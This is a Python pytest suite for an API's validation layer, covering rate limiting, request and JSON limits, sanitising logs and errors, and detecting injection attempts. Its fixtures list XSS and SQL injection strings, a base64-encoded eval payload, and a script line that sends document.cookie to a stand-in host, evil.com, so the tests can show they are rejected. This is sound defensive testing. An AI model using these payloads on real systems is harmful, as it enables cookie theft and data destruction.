"""
Tests for input validation and security measures

Comprehensive test suite for validating all security measures including
request size limits, parameter validation, rate limiting, and injection detection.
"""

import json
import time
from unittest.mock import Mock, patch

import pytest

from ..core.validation import RateLimiter, InputValidator, SecurityValidator
from ..core.constants import APIConstants, ValidationMessages
from ..core.exceptions import ValidationError


class TestRateLimiter:
    """Test rate limiting functionality"""
    
    def test_allows_requests_under_limit(self):
        """Test that requests under the limit are allowed"""
        limiter = RateLimiter(max_requests=5, window_seconds=60)
        client_ip = "192.168.1.1"
        
        # Should allow 5 requests
        for _ in range(5):
            assert limiter.is_allowed(client_ip) is True
    
    def test_blocks_requests_over_limit(self):
        """Test that requests over the limit are blocked"""
        limiter = RateLimiter(max_requests=3, window_seconds=60)
        client_ip = "192.168.1.1"
        
        # Allow 3 requests
        for _ in range(3):
            assert limiter.is_allowed(client_ip) is True
        
        # Block the 4th request
        assert limiter.is_allowed(client_ip) is False
    
    def test_burst_limiting(self):
        """Test burst limiting functionality"""
        limiter = RateLimiter(max_requests=60, window_seconds=60, burst_limit=3)
        client_ip = "192.168.1.1"
        
        # Allow burst of 3
        for _ in range(3):
            assert limiter.is_allowed(client_ip) is True
        
        # Block the 4th burst request
        assert limiter.is_allowed(client_ip) is False
    
    def test_different_ips_independent(self):
        """Test that different IPs have independent limits"""
        limiter = RateLimiter(max_requests=2, window_seconds=60)
        
        # IP1 uses up its limit
        assert limiter.is_allowed("192.168.1.1") is True
        assert limiter.is_allowed("192.168.1.1") is True
        assert limiter.is_allowed("192.168.1.1") is False
        
        # IP2 should still be allowed
        assert limiter.is_allowed("192.168.1.2") is True
        assert limiter.is_allowed("192.168.1.2") is True
    
    def test_window_reset(self):
        """Test that rate limit resets after window"""
        limiter = RateLimiter(max_requests=1, window_seconds=1)
        client_ip = "192.168.1.1"
        
        # Use up the limit
        assert limiter.is_allowed(client_ip) is True
        assert limiter.is_allowed(client_ip) is False
        
        # Wait for window to reset
        time.sleep(1.1)
        
        # Should be allowed again
        assert limiter.is_allowed(client_ip) is True
    
    def test_get_remaining(self):
        """Test getting remaining requests"""
        limiter = RateLimiter(max_requests=5, window_seconds=60)
        client_ip = "192.168.1.1"
        
        assert limiter.get_remaining(client_ip) == 5
        
        limiter.is_allowed(client_ip)
        assert limiter.get_remaining(client_ip) == 4
        
        limiter.is_allowed(client_ip)
        assert limiter.get_remaining(client_ip) == 3


class TestInputValidator:
    """Test input validation functionality"""
    
    @pytest.fixture
    def validator(self):
        return InputValidator()
    
    def test_request_size_validation(self, validator):
        """Test request size limits"""
        # Should allow normal size
        validator.validate_request_size(1000)
        
        # Should reject oversized request
        with pytest.raises(ValidationError, match=ValidationMessages.REQUEST_TOO_LARGE):
            validator.validate_request_size(APIConstants.MAX_REQUEST_SIZE + 1)
    
    def test_json_depth_validation(self, validator):
        """Test JSON nesting depth limits"""
        # Create deeply nested object
        deep_object = {}
        current = deep_object
        for i in range(APIConstants.MAX_JSON_DEPTH + 1):
            current['nested'] = {}
            current = current['nested']
        
        with pytest.raises(ValidationError, match="nesting exceeds maximum depth"):
            validator.validate_json_structure(deep_object)
    
    def test_string_length_validation(self, validator):
        """Test string length limits"""
        # Normal string should pass
        validator.validate_string_parameter("test", "normal string")
        
        # Too long string should fail
        long_string = "x" * (APIConstants.MAX_STRING_LENGTH + 1)
        with pytest.raises(ValidationError, match="exceeds maximum length"):
            validator.validate_string_parameter("test", long_string)
    
    def test_array_length_validation(self, validator):
        """Test array length limits"""
        # Normal array should pass
        normal_array = list(range(100))
        validator.validate_json_structure(normal_array)
        
        # Too long array should fail
        long_array = list(range(APIConstants.MAX_ARRAY_LENGTH + 1))
        with pytest.raises(ValidationError, match="exceeds maximum length"):
            validator.validate_json_structure(long_array)
    
    def test_method_name_validation(self, validator):
        """Test method name validation"""
        allowed_methods = {"run_skill", "run_bridge", "chat_query"}
        
        # Valid method should pass
        validator.validate_method_name("run_skill", allowed_methods)
        
        # Invalid method should fail
        with pytest.raises(ValidationError):
            validator.validate_method_name("invalid_method", allowed_methods)
        
        # Method with invalid characters should fail
        with pytest.raises(ValidationError):
            validator.validate_method_name("run-skill!", allowed_methods)
        
        # Too long method should fail
        long_method = "x" * 51
        with pytest.raises(ValidationError):
            validator.validate_method_name(long_method, allowed_methods)
    
    def test_skill_name_validation(self, validator):
        """Test skill name validation"""
        allowed_skills = {"echo", "sifter", "lead_scout"}
        
        # Valid skill should pass
        validator.validate_skill_name("echo", allowed_skills)
        
        # Invalid skill should fail
        with pytest.raises(ValidationError):
            validator.validate_skill_name("invalid_skill", allowed_skills)
    
    def test_response_type_validation(self, validator):
        """Test response type validation"""
        allowed_types = {"json", "email", "chat"}
        
        # Valid type should pass
        validator.validate_response_type("json", allowed_types)
        
        # Invalid type should fail
        with pytest.raises(ValidationError):
            validator.validate_response_type("xml", allowed_types)
        
        # Type with invalid characters should fail
        with pytest.raises(ValidationError):
            validator.validate_response_type("json<script>", allowed_types)
    
    def test_dict_parameter_validation(self, validator):
        """Test dictionary parameter validation"""
        # Valid dict should pass
        validator.validate_dict_parameter("params", {"key": "value"})
        
        # None should pass if not required
        validator.validate_dict_parameter("params", None, required=False)
        
        # None should fail if required
        with pytest.raises(ValidationError):
            validator.validate_dict_parameter("params", None, required=True)
        
        # Non-dict should fail
        with pytest.raises(ValidationError):
            validator.validate_dict_parameter("params", "not a dict")
    
    def test_error_message_sanitization(self, validator):
        """Test error message sanitization"""
        # Should remove sensitive information
        message = "Error: password=secret123 and token=abc456"
        sanitized = validator.sanitize_error_message(message)
        
        assert "secret123" not in sanitized
        assert "abc456" not in sanitized
        assert "<hidden>" in sanitized
        
        # Should truncate long messages
        long_message = "x" * 600
        sanitized = validator.sanitize_error_message(long_message)
        assert len(sanitized) <= 504  # 500 + "..."
    
    def test_log_data_sanitization(self, validator):
        """Test log data sanitization"""
        sensitive_data = {
            "username": "user123",
            "password": "secret",
            "api_key": "key123",
            "data": {
                "token": "token456",
                "safe_field": "safe_value"
            }
        }
        
        sanitized = validator.sanitize_log_data(sensitive_data)
        
        assert sanitized["username"] == "user123"  # Non-sensitive kept
        assert sanitized["password"] == "<hidden>"  # Sensitive hidden
        assert sanitized["api_key"] == "<hidden>"  # Sensitive hidden
        assert sanitized["data"]["token"] == "<hidden>"  # Nested sensitive hidden
        assert sanitized["data"]["safe_field"] == "safe_value"  # Nested non-sensitive kept


class TestSecurityValidator:
    """Test security validation functionality"""
    
    @pytest.fixture
    def validator(self):
        return SecurityValidator()
    
    def test_script_injection_detection(self, validator):
        """Test detection of script injections"""
        malicious_inputs = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "vbscript:msgbox('xss')",
            "onload=alert('xss')",
            "onerror=alert('xss')"
        ]
        
        for malicious_input in malicious_inputs:
            assert validator.detect_injection_attempt(malicious_input) is True
    
    def test_sql_injection_detection(self, validator):
        """Test detection of SQL injections"""
        malicious_inputs = [
            "SELECT * FROM users",
            "INSERT INTO users VALUES",
            "UPDATE users SET password",
            "DELETE FROM users",
            "DROP TABLE users",
            "UNION SELECT password FROM users",
            "'; DROP TABLE users; --"
        ]
        
        for malicious_input in malicious_inputs:
            assert validator.detect_injection_attempt(malicious_input) is True
    
    def test_safe_input_passes(self, validator):
        """Test that safe input passes validation"""
        safe_inputs = [
            "Hello world",
            "user@example.com",
            "Normal text with numbers 123",
            "Query about business metrics"
        ]
        
        for safe_input in safe_inputs:
            assert validator.detect_injection_attempt(safe_input) is False
    
    def test_nested_injection_detection(self, validator):
        """Test detection in nested data structures"""
        # Should detect injection in nested data
        malicious_data = {
            "user": "normal_user",
            "params": {
                "query": "<script>alert('xss')</script>",
                "safe_param": "safe_value"
            }
        }
        
        with pytest.raises(ValidationError):
            validator.validate_safe_input(malicious_data)
        
        # Should pass safe nested data
        safe_data = {
            "user": "normal_user",
            "params": {
                "query": "What are my priorities?",
                "context": "business planning"
            }
        }
        
        # Should not raise exception
        validator.validate_safe_input(safe_data)


class TestIntegrationValidation:
    """Integration tests for complete validation pipeline"""
    
    def test_complete_request_validation(self):
        """Test complete request validation pipeline"""
        from ..mcp.schemas import validate_mcp_request
        
        # Valid request should pass
        valid_request = {
            "method": "chat_query",
            "params": {
                "query": "What are my priorities this week?"
            },
            "response_type": "json",
            "id": "test-123"
        }
        
        result = validate_mcp_request(valid_request)
        assert result.method == "chat_query"
        assert result.params["query"] == "What are my priorities this week?"
        
        # Invalid request should fail
        invalid_requests = [
            {},  # Missing method
            {"method": "invalid_method"},  # Unknown method
            {"method": "chat_query", "params": "not_a_dict"},  # Invalid params
            {"method": "chat_query", "response_type": "invalid_type"},  # Invalid response type
        ]
        
        for invalid_request in invalid_requests:
            with pytest.raises(ValidationError):
                validate_mcp_request(invalid_request)
    
    def test_large_request_handling(self):
        """Test handling of large requests"""
        validator = InputValidator()
        
        # Create large but valid request
        large_params = {f"param_{i}": f"value_{i}" for i in range(45)}  # Under limit
        validator.validate_dict_parameter("params", large_params)
        
        # Create oversized request
        oversized_params = {f"param_{i}": f"value_{i}" for i in range(55)}  # Over limit
        with pytest.raises(ValidationError):
            validator.validate_dict_parameter("params", oversized_params)
    
    def test_malicious_payload_rejection(self):
        """Test rejection of various malicious payloads"""
        security_validator = SecurityValidator()
        
        malicious_payloads = [
            {
                "method": "chat_query",
                "params": {
                    "query": "<script>fetch('http://evil.com/steal?data='+document.cookie)</script>"
                }
            },
            {
                "method": "run_skill",
                "params": {
                    "skill_name": "echo",
                    "input": {
                        "data": "'; DROP TABLE users; --"
                    }
                }
            },
            {
                "method": "run_bridge",
                "params": {
                    "function_name": "weekly_digest",
                    "params": {
                        "eval_code": "eval(atob('YWxlcnQoJ1hTUycpOw=='))"  # base64 encoded XSS
                    }
                }
            }
        ]
        
        for payload in malicious_payloads:
            with pytest.raises(ValidationError):
                security_validator.validate_safe_input(payload)